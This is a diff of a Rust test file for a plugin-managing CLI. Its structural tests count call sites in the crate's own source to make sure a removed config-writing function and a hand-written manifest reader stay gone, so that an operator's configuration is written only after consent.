+/// Sabotage: drop the sentence. It is named here and by the surface that writes
+/// the key, so removing it fails here by name.
+///
+/// The key is no longer written by a marketplace install — see `pluginview::add_off`
+/// — but the sentence still has to be right wherever it is, so this stays a check
+/// on the words rather than on a call site.
 #[test]
 fn f12_writing_enabled_says_what_it_costs_an_older_binary() {
     let said = io_cli::pluginview::OLDER_BINARY;
@@ -1628,36 +1830,65 @@ fn f12_writing_enabled_says_what_it_costs_an_older_binary() {
             "the disclosure does not name `{named}`: {said}",
         );
     }
+}
 
-    // Both doors say it, and neither writes its own words. The library's other two
-    // gates in this file guard the same property for the fetch and the removal.
-    let driver = code_of("src/main.rs");
+/// **F16 and F17, structurally — there is one reader and one validator, and the
+/// round trip is gone.**
+///
+/// The behavioural tests above are about what an install answers. These are about
+/// what the code can be made to do: a sabotage that restores either the hand reader
+/// or the `add_off` round trip has to be written *somewhere*, and this is where the
+/// two places it could go are pinned.
+///
+/// Sabotage: put `pluginview::add_off` back into `manage::plan` — the first gate is
+/// the one that fails, and it is exactly F17's named sabotage. Put a `[[hook]]`
+/// reader back into `marketplace` — the second fails, and it is F16's.
+#[test]
+fn f16_and_f17_have_one_reader_and_one_validator() {
+    let planner = code_of("src/manage.rs");
     assert_eq!(
-        driver.matches("OLDER_BINARY").count(),
-        2,
-        "`OLDER_BINARY` is named from {} places in src/main.rs, not 2 — the typed \
-         slash form and the argument form. A count of one is a door that writes an \
-         `enabled` key and says nothing about it.",
-        driver.matches("OLDER_BINARY").count(),
-    );
-    assert_eq!(
-        driver.matches("pluginview::add_off(").count(),
+        planner.matches("pluginview::add_off(").count(),
         0,
-        "src/main.rs writes a disclosing entry itself rather than through \
-         `manage::plan`, so the two doors can declare a marketplace bundle \
-         differently",
+        "`manage::plan` declares a marketplace bundle switched off again, so the \
+         operator's file is written before io-harness has been asked whether the \
+         bundle would load at all",
+    );
+    // **The stronger form, once the function itself was deleted.** Asserting that
+    // one module does not *call* `add_off` stops being much of a gate the moment
+    // nothing anywhere can: a sabotage restoring the round trip would have to write
+    // the function back first, and this is what fails when it does. The pair is
+    // kept rather than replaced — the call-site count is what fails if somebody
+    // reintroduces it and wires it in one step.
+    assert_eq!(
+        code_of("src/pluginview.rs").matches("fn add_off").count(),
+        0,
+        "`pluginview::add_off` is back. It wrote `enabled = false` so that \
+         io-harness would read a bundle at all, which `Plugins::inspect` made \
+         unnecessary in 0.30.0 — and it was the last thing that wrote to an \
+         operator's configuration before they had consented to anything",
     );
     assert_eq!(
-        code_of("src/manage.rs")
-            .matches("pluginview::add_off(")
-            .count(),
+        planner.matches("marketplace::disclosure(").count(),
         1,
-        "the disclosing entry has more than one writer",
+        "the validation that gates the write has {} call sites in src/manage.rs, not \
+         1 — a second is a second answer about whether a bundle may be declared",
+        planner.matches("marketplace::disclosure(").count(),
     );
-    assert_eq!(
-        driver.matches("pluginview::enable(").count(),
-        1,
-        "consent has more than one call site, so a second one can flip the key \
-         without the disclosure that earns it",
+
+    // The hand reader is gone from the one file whose job was reading somebody
+    // else's manifest, and it did not move anywhere else: `edit::value_at` is how
+    // it read a `[[hook]]` table, and no file in this crate addresses one now.
+    for name in ["src/marketplace.rs", "src/pluginview.rs", "src/manage.rs"] {
+        let code = code_of(name);
+        assert!(
+            !code.contains("hook["),
+            "{name} addresses a `[[hook]]` table by index, so io-cli is reading a \
+             stranger's manifest again — and its reader cannot see an inline \
+             `hook = [{{…}}]` array or a header with a comment on it",
+        );
+    }
+    assert!(
+        code_of("src/pluginview.rs").contains("plugin.hooks()"),
+        "the hook rows do not come from `Plugin::hooks()`",
     );
 }
